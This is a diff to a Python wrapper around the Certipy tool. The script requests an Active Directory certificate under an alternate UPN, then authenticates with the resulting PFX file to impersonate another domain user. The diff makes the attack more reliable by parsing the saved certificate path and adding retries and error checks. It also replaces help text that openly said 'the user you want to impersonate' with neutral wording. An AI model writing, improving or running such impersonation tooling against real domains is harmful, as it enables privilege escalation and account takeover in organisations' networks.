@@ -2,6 +2,7 @@ import argparse
 import subprocess
 import sys
 import time
+import re
 
 # Define colors
 Bold = '\033[1m'
@@ -42,7 +43,7 @@ def main():
     parser.add_argument('-host', '--target-host', required=True, help="DNS name of target host")
     parser.add_argument('-u', '--user', required=True, help="Username to authenticate with")
     parser.add_argument('-p', '--password', required=True, help="Password for the user")
-    parser.add_argument('-upn', '--upn', required=True, help="Alternate UPN for certificate request, AKA the user you want to impersonate")
+    parser.add_argument('-upn', '--upn', required=True, help="UPN for certificate request")
     parser.add_argument('-dns', '--dns', required=True, help="DNS for certificate request")
     parser.add_argument('-ns', '--ns', required=True, help="NS for certificate request")
 
@@ -76,9 +77,15 @@ def main():
         "-dns", args.dns
     ], retries=2)
 
-    if result is None or "Successfully requested certificate" not in result:
+    cert_file = None
+    if result and "Saved certificate and private key to" in result:
+        match = re.search(r"Saved certificate and private key to '(.*?)'", result)
+        if match:
+            cert_file = match.group(1)
+    
+    if cert_file is None:
         print(f"{Yellow}{Bold}[Step 2 - Retry with Debug]{NC} Retrying with -debug flag...")
-        run_command([
+        result = run_command([
             "certipy", "req",
             "-u", args.user,
             "-p", args.password,
@@ -91,17 +98,24 @@ def main():
             "-dns", args.dns,
             "-debug"
         ])
+        if result and "Saved certificate and private key to" in result:
+            match = re.search(r"Saved certificate and private key to '(.*?)'", result)
+            if match:
+                cert_file = match.group(1)
+
+    if cert_file is None:
+        print(f"{Red}{Bold}[ERROR]{NC} Failed to obtain certificate. Ensure the request was successful.")
+        sys.exit(1)
 
     # Step 3: Authenticate using PFX
     print(f"{Yellow}{Bold}[Step 3]{NC} Authenticating using PFX file...")
-    pfx_file = f"{args.upn.split('@')[0]}_{args.dc_ip}.pfx"
     auth_result = run_command([
         "certipy", "auth",
-        "-pfx", pfx_file,
+        "-pfx", cert_file,
         "-dc-ip", args.dc_ip
     ])
 
-    if auth_result is None or "No such file or directory" in auth_result:
+    if auth_result is None or "Got error" in auth_result:
         print(f"{Red}{Bold}[ERROR]{NC} Failed to authenticate using the PFX file. Ensure the certificate request was successful.")
         sys.exit(1)
 
